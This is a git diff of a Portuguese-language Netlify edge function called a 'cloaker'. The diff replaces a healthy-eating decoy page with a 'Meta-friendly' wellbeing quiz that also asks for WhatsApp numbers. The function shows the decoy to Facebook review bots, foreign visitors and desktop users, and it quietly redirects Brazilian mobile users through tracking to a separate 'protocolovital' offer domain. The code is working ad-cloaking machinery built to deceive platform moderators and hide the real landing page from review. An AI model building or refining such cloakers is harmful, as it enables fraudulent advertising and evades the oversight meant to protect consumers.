@@ -1,5 +1,5 @@
 // netlify/edge-functions/cloaker.js
-// CLOAKER ATUALIZADO COM UTMIFY INTEGRADO
+// CLOAKER ATUALIZADO COM UTMIFY INTEGRADO + QUIZ WHITE
 
 // === LISTAS DE DETECÇÃO EXISTENTES ===
 const FACEBOOK_BOTS = [
@@ -89,67 +89,305 @@ const detectBot = (userAgent) => {
   return { isBot: false };
 };
 
-// === WHITE PAGE ===
-const generateWhitePage = (reason, details = {}) => {
+// === QUIZ WHITE PAGE (META FRIENDLY) ===
+const generateWhiteQuiz = (reason, details = {}) => {
   return `<!DOCTYPE html>
 <html lang="pt-BR">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Alimentação Saudável - Dicas e Receitas Naturais</title>
-    <meta name="description" content="Descubra receitas naturais e dicas de alimentação saudável para uma vida melhor.">
+    <title>Quiz de Bem-estar | Descubra seu Perfil de Hábitos Saudáveis</title>
+    <meta name="description" content="Questionário sobre hábitos de bem-estar e estilo de vida equilibrado. Descubra dicas personalizadas para melhorar sua qualidade de vida.">
     <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body { 
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            max-width: 800px; margin: 0 auto; padding: 20px; line-height: 1.6; color: #333;
-            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%); min-height: 100vh;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh; display: flex; align-items: center; justify-content: center;
+            padding: 20px; color: #333;
         }
-        .container { background: white; border-radius: 12px; padding: 40px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); }
-        .header { text-align: center; margin-bottom: 40px; color: #2E7D32; }
-        .content { background: #f8f9fa; padding: 30px; border-radius: 8px; margin-bottom: 30px; }
-        .recipe-card { background: white; margin: 15px 0; padding: 20px; border-radius: 8px; 
-                      border-left: 4px solid #4CAF50; box-shadow: 0 2px 8px rgba(0,0,0,0.05); }
-        .tip { background: linear-gradient(45deg, #4CAF50, #45a049); color: white; 
-               padding: 20px; border-radius: 8px; margin: 20px 0; }
-        .footer { text-align: center; margin-top: 40px; color: #666; font-size: 14px; }
+        .quiz-container {
+            background: white; border-radius: 20px; padding: 30px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.1); max-width: 500px; width: 100%;
+        }
+        .quiz-header { text-align: center; margin-bottom: 30px; }
+        .quiz-title { color: #4a5568; font-size: 24px; margin-bottom: 10px; font-weight: 600; }
+        .quiz-subtitle { color: #718096; font-size: 16px; line-height: 1.5; }
+        .progress-bar { background: #e2e8f0; height: 8px; border-radius: 4px; margin: 20px 0; overflow: hidden; }
+        .progress-fill { background: linear-gradient(90deg, #48bb78, #38a169); height: 100%; width: 0%; 
+                        transition: width 0.5s ease; border-radius: 4px; }
+        .question { margin-bottom: 30px; }
+        .question-text { font-size: 18px; margin-bottom: 20px; color: #2d3748; font-weight: 500; }
+        .options { display: grid; gap: 12px; }
+        .option { background: #f7fafc; border: 2px solid #e2e8f0; border-radius: 12px; padding: 16px;
+                 cursor: pointer; transition: all 0.3s ease; text-align: left; }
+        .option:hover { border-color: #4299e1; background: #ebf8ff; }
+        .option.selected { border-color: #48bb78; background: #f0fff4; }
+        .option-text { font-size: 15px; color: #4a5568; }
+        .next-btn { background: linear-gradient(135deg, #48bb78, #38a169); color: white; border: none;
+                   border-radius: 12px; padding: 16px 32px; font-size: 16px; font-weight: 600;
+                   cursor: pointer; width: 100%; margin-top: 20px; transition: transform 0.2s ease; }
+        .next-btn:hover { transform: translateY(-2px); }
+        .next-btn:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
+        .step-hidden { display: none; }
+        .result-card { background: linear-gradient(135deg, #4299e1, #3182ce); color: white; 
+                      border-radius: 16px; padding: 24px; text-align: center; margin-top: 20px; }
+        .result-title { font-size: 20px; margin-bottom: 16px; font-weight: 600; }
+        .result-text { font-size: 16px; line-height: 1.6; opacity: 0.9; }
+        .whatsapp-form { background: #f0fff4; border-radius: 12px; padding: 20px; margin-top: 20px; }
+        .whatsapp-title { color: #2f855a; font-size: 18px; margin-bottom: 16px; font-weight: 600; }
+        .phone-input { width: 100%; padding: 12px 16px; border: 2px solid #e2e8f0; border-radius: 8px;
+                      font-size: 16px; margin-bottom: 12px; }
+        .phone-input:focus { outline: none; border-color: #48bb78; }
+        .phone-error { color: #e53e3e; font-size: 14px; margin-top: 8px; display: none; }
+        .submit-btn { background: #25d366; color: white; border: none; border-radius: 8px;
+                     padding: 12px 24px; font-size: 16px; font-weight: 600; cursor: pointer; width: 100%; }
+        .emoji { font-size: 24px; margin-bottom: 16px; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="header">
-            <h1>🌿 Alimentação Saudável</h1>
-            <p>Receitas naturais para uma vida mais equilibrada</p>
+    <div class="quiz-container">
+        <div class="quiz-header">
+            <div class="emoji">🌱</div>
+            <h1 class="quiz-title">Quiz de Bem-estar</h1>
+            <p class="quiz-subtitle">Descubra seu perfil de hábitos saudáveis e receba dicas personalizadas para melhorar sua qualidade de vida</p>
         </div>
         
-        <div class="content">
-            <h2>🥗 Dicas de Nutrição Natural</h2>
-            <p>Uma alimentação equilibrada é a base para uma vida saudável. Conheça os benefícios de ingredientes naturais:</p>
-            
-            <div class="recipe-card">
-                <h3>🍋 Água com Limão</h3>
-                <p><strong>Benefícios:</strong> Rica em vitamina C, estimula a digestão e fortalece a imunidade.</p>
-                <p><strong>Como usar:</strong> Misture o suco de meio limão em um copo de água morna e consuma em jejum.</p>
-            </div>
-            
-            <div class="recipe-card">
-                <h3>🫚 Chá de Gengibre</h3>
-                <p><strong>Benefícios:</strong> Propriedades anti-inflamatórias, melhora a digestão e acelera o metabolismo.</p>
-                <p><strong>Como preparar:</strong> Ferva fatias de gengibre fresco por 10 minutos e beba morno.</p>
-            </div>
-            
-            <div class="tip">
-                <h3>💡 Dica Especial: Detox Matinal</h3>
-                <p>Combine água morna + limão + gengibre para um poderoso detox natural!</p>
-            </div>
-            
-            <h3>🏥 Importante</h3>
-            <p>Estas são dicas gerais de alimentação saudável. Para orientações personalizadas, consulte sempre um nutricionista.</p>
+        <div class="progress-bar">
+            <div class="progress-fill" id="progressBar"></div>
         </div>
         
-        <div class="footer">
-            <p>✨ Cuide da sua saúde com ingredientes naturais ✨</p>
+        <!-- Pergunta 1 -->
+        <div class="question step-1">
+            <h3 class="question-text">Qual é a sua rotina matinal favorita?</h3>
+            <div class="options">
+                <div class="option" data-value="a">
+                    <div class="option-text">☀️ Acordo cedo e faço alongamentos</div>
+                </div>
+                <div class="option" data-value="b">
+                    <div class="option-text">☕ Tomo um café tranquilo lendo algo inspirador</div>
+                </div>
+                <div class="option" data-value="c">
+                    <div class="option-text">🚿 Banho revigorante e música motivacional</div>
+                </div>
+                <div class="option" data-value="d">
+                    <div class="option-text">🧘 Alguns minutos de respiração consciente</div>
+                </div>
+            </div>
+            <button class="next-btn" disabled onclick="nextQuestion()">Próxima Pergunta</button>
+        </div>
+        
+        <!-- Pergunta 2 -->
+        <div class="question step-2 step-hidden">
+            <h3 class="question-text">Como você prefere relaxar após um dia produtivo?</h3>
+            <div class="options">
+                <div class="option" data-value="a">
+                    <div class="option-text">📚 Lendo um bom livro ou assistindo algo educativo</div>
+                </div>
+                <div class="option" data-value="b">
+                    <div class="option-text">🛁 Um banho relaxante com aromas suaves</div>
+                </div>
+                <div class="option" data-value="c">
+                    <div class="option-text">🚶 Caminhada ao ar livre ou jardim</div>
+                </div>
+                <div class="option" data-value="d">
+                    <div class="option-text">🎵 Música tranquila e um chá reconfortante</div>
+                </div>
+            </div>
+            <button class="next-btn" disabled onclick="nextQuestion()">Próxima Pergunta</button>
+        </div>
+        
+        <!-- Pergunta 3 -->
+        <div class="question step-3 step-hidden">
+            <h3 class="question-text">Qual atividade física mais te motiva?</h3>
+            <div class="options">
+                <div class="option" data-value="a">
+                    <div class="option-text">🤸 Yoga ou pilates para flexibilidade</div>
+                </div>
+                <div class="option" data-value="b">
+                    <div class="option-text">🏃 Caminhadas ou corridas leves</div>
+                </div>
+                <div class="option" data-value="c">
+                    <div class="option-text">💃 Dança ou atividades musicais</div>
+                </div>
+                <div class="option" data-value="d">
+                    <div class="option-text">🏊 Natação ou atividades aquáticas</div>
+                </div>
+            </div>
+            <button class="next-btn" disabled onclick="nextQuestion()">Próxima Pergunta</button>
+        </div>
+        
+        <!-- Pergunta 4 -->
+        <div class="question step-4 step-hidden">
+            <h3 class="question-text">Qual é seu tipo de alimentação preferida?</h3>
+            <div class="options">
+                <div class="option" data-value="a">
+                    <div class="option-text">🥗 Saladas coloridas e alimentos frescos</div>
+                </div>
+                <div class="option" data-value="b">
+                    <div class="option-text">🍲 Pratos caseiros com temperos naturais</div>
+                </div>
+                <div class="option" data-value="c">
+                    <div class="option-text">🥑 Alimentos nutritivos e funcionais</div>
+                </div>
+                <div class="option" data-value="d">
+                    <div class="option-text">🍵 Bebidas naturais e lanches equilibrados</div>
+                </div>
+            </div>
+            <button class="next-btn" disabled onclick="nextQuestion()">Próxima Pergunta</button>
+        </div>
+        
+        <!-- Pergunta 5 -->
+        <div class="question step-5 step-hidden">
+            <h3 class="question-text">Como você organiza seu ambiente de trabalho?</h3>
+            <div class="options">
+                <div class="option" data-value="a">
+                    <div class="option-text">🌿 Com plantas e elementos naturais</div>
+                </div>
+                <div class="option" data-value="b">
+                    <div class="option-text">📝 Tudo organizado e funcional</div>
+                </div>
+                <div class="option" data-value="c">
+                    <div class="option-text">💡 Iluminação adequada e espaço arejado</div>
+                </div>
+                <div class="option" data-value="d">
+                    <div class="option-text">🖼️ Decoração inspiradora e motivacional</div>
+                </div>
+            </div>
+            <button class="next-btn" disabled onclick="nextQuestion()">Próxima Pergunta</button>
+        </div>
+        
+        <!-- Pergunta 6 -->
+        <div class="question step-6 step-hidden">
+            <h3 class="question-text">Qual é sua forma favorita de buscar conhecimento?</h3>
+            <div class="options">
+                <div class="option" data-value="a">
+                    <div class="option-text">📖 Livros e artigos sobre desenvolvimento pessoal</div>
+                </div>
+                <div class="option" data-value="b">
+                    <div class="option-text">🎧 Podcasts e audiobooks durante atividades</div>
+                </div>
+                <div class="option" data-value="c">
+                    <div class="option-text">👥 Conversas com pessoas inspiradoras</div>
+                </div>
+                <div class="option" data-value="d">
+                    <div class="option-text">💻 Cursos online e conteúdo educativo</div>
+                </div>
+            </div>
+            <button class="next-btn" disabled onclick="nextQuestion()">Próxima Pergunta</button>
+        </div>
+        
+        <!-- Pergunta 7 -->
+        <div class="question step-7 step-hidden">
+            <h3 class="question-text">Como você gosta de passar os finais de semana?</h3>
+            <div class="options">
+                <div class="option" data-value="a">
+                    <div class="option-text">🏞️ Em contato com a natureza e ar puro</div>
+                </div>
+                <div class="option" data-value="b">
+                    <div class="option-text">👨‍👩‍👧‍👦 Tempo de qualidade com família e amigos</div>
+                </div>
+                <div class="option" data-value="c">
+                    <div class="option-text">🎨 Atividades criativas e hobbies pessoais</div>
+                </div>
+                <div class="option" data-value="d">
+                    <div class="option-text">🧘 Momentos de reflexão e autocuidado</div>
+                </div>
+            </div>
+            <button class="next-btn" disabled onclick="showResult()">Ver Resultado</button>
+        </div>
+        
+        <!-- Resultado -->
+        <div class="question step-result step-hidden">
+            <div class="result-card">
+                <div class="emoji">🌟</div>
+                <h3 class="result-title">Seu Perfil: Pessoa Equilibrada</h3>
+                <p class="result-text">Parabéns! Você demonstra ter bons hábitos de bem-estar e busca constantemente o equilíbrio em sua vida. Continue cultivando essas práticas saudáveis que contribuem para sua qualidade de vida.</p>
+            </div>
+            
+            <div class="whatsapp-form">
+                <h4 class="whatsapp-title">📱 Receba Dicas Personalizadas</h4>
+                <p style="color: #4a5568; margin-bottom: 16px; font-size: 14px;">Deixe seu WhatsApp para receber dicas semanais de bem-estar baseadas no seu perfil:</p>
+                <input type="tel" 
+                       class="phone-input" 
+                       id="phoneInput" 
+                       placeholder="(11) 99999-9999" 
+                       maxlength="15">
+                <div class="phone-error" id="phoneError">
+                    Por favor, insira um número de WhatsApp brasileiro válido (ex: 11999999999)
+                </div>
+                <button class="submit-btn" onclick="validateAndSubmit()">Receber Dicas de Bem-estar</button>
+            </div>
         </div>
     </div>
+
+    <script>
+        let currentStep = 1;
+        let answers = {};
+        
+        // Adicionar listeners para as opções
+        document.addEventListener('DOMContentLoaded', function() {
+            const options = document.querySelectorAll('.option');
+            options.forEach(option => {
+                option.addEventListener('click', function() {
+                    const parent = this.closest('.question');
+                    parent.querySelectorAll('.option').forEach(opt => opt.classList.remove('selected'));
+                    this.classList.add('selected');
+                    
+                    const btn = parent.querySelector('.next-btn');
+                    btn.disabled = false;
+                    
+                    const questionNumber = parent.className.match(/step-(\\d+)/)[1];
+                    answers[questionNumber] = this.dataset.value;
+                });
+            });
+        });
+        
+        function nextQuestion() {
+            document.querySelector('.step-' + currentStep).classList.add('step-hidden');
+            currentStep++;
+            document.querySelector('.step-' + currentStep).classList.remove('step-hidden');
+            updateProgress();
+        }
+        
+        function showResult() {
+            document.querySelector('.step-' + currentStep).classList.add('step-hidden');
+            document.querySelector('.step-result').classList.remove('step-hidden');
+            updateProgress();
+        }
+        
+        function updateProgress() {
+            const progress = (currentStep / 7) * 100;
+            document.getElementById('progressBar').style.width = progress + '%';
+        }
+        
+        function validateAndSubmit() {
+            const phoneInput = document.getElementById('phoneInput');
+            const phoneError = document.getElementById('phoneError');
+            const phone = phoneInput.value.replace(/\\D/g, '');
+            
+            // Validação para número brasileiro (11 dígitos, começando com 11-99)
+            const brazilianPhoneRegex = /^[1-9][1-9][9][0-9]{8}$/;
+            
+            if (!brazilianPhoneRegex.test(phone)) {
+                phoneError.style.display = 'block';
+                phoneInput.style.borderColor = '#e53e3e';
+                return;
+            }
+            
+            phoneError.style.display = 'none';
+            phoneInput.style.borderColor = '#48bb78';
+            
+            // Simular sucesso
+            alert('Obrigado! Em breve você receberá dicas personalizadas de bem-estar no seu WhatsApp.');
+        }
+        
+        // Máscara para o telefone
+        document.getElementById('phoneInput').addEventListener('input', function(e) {
+            let x = e.target.value.replace(/\\D/g, '').match(/(\\d{0,2})(\\d{0,5})(\\d{0,4})/);
+            e.target.value = !x[2] ? x[1] : '(' + x[1] + ') ' + x[2] + (x[3] ? '-' + x[3] : '');
+        });
+    </script>
     
     <!-- Debug: ${reason} -->
 </body>
@@ -281,7 +519,7 @@ export default async (request, context) => {
     const botDetection = detectBot(userAgent);
     if (botDetection.isBot) {
       console.log(`🤖 Bot detectado: ${botDetection.type} - ${botDetection.reason}`);
-      return new Response(generateWhitePage('bot_detected', botDetection), {
+      return new Response(generateWhiteQuiz('bot_detected', botDetection), {
         status: 200,
         headers: { 'content-type': 'text/html; charset=utf-8', 'cache-control': 'public, max-age=3600' }
       });
@@ -291,7 +529,7 @@ export default async (request, context) => {
     const geoDetection = detectCountry(request, context);
     if (!geoDetection.isBrazil) {
       console.log(`🌍 País bloqueado: ${geoDetection.country} - IP: ${ip}`);
-      return new Response(generateWhitePage('country_blocked', geoDetection), {
+      return new Response(generateWhiteQuiz('country_blocked', geoDetection), {
         status: 200,
         headers: { 'content-type': 'text/html; charset=utf-8', 'cache-control': 'public, max-age=3600' }
       });
@@ -301,14 +539,14 @@ export default async (request, context) => {
     const mobileDetection = detectMobileDevice(userAgent);
     if (!mobileDetection.isAllowed) {
       console.log(`📱 Dispositivo bloqueado: ${mobileDetection.deviceType} - ${mobileDetection.reason}`);
-      return new Response(generateWhitePage('device_blocked', mobileDetection), {
+      return new Response(generateWhiteQuiz('device_blocked', mobileDetection), {
         status: 200,
         headers: { 'content-type': 'text/html; charset=utf-8', 'cache-control': 'public, max-age=3600' }
       });
     }
     
     // 4. USUÁRIO VÁLIDO → PÁGINA INTERMEDIÁRIA COM UTMIFY
-    const targetUrl = `https://test.protocolovital4f.online${url.pathname}${url.search}`;
+    const targetUrl = `https://teste.protocolovital4f.online${url.pathname}${url.search}`;
     
     console.log(`✅ Usuário válido: ${mobileDetection.deviceType} - Brasil - IP: ${ip.substring(0, 10)}***`);
     console.log(`🎯 Executando UTMify + redirect para: ${targetUrl}`);
@@ -327,7 +565,7 @@ export default async (request, context) => {
     console.error('❌ Erro no cloaker:', error);
     
     // Failsafe: em caso de erro, redirect direto
-    const targetUrl = `https://test.protocolovital4f.online${new URL(request.url).pathname}${new URL(request.url).search}`;
+    const targetUrl = `https://teste.protocolovital4f.online${new URL(request.url).pathname}${new URL(request.url).search}`;
     return Response.redirect(targetUrl, 302);
   }
 };
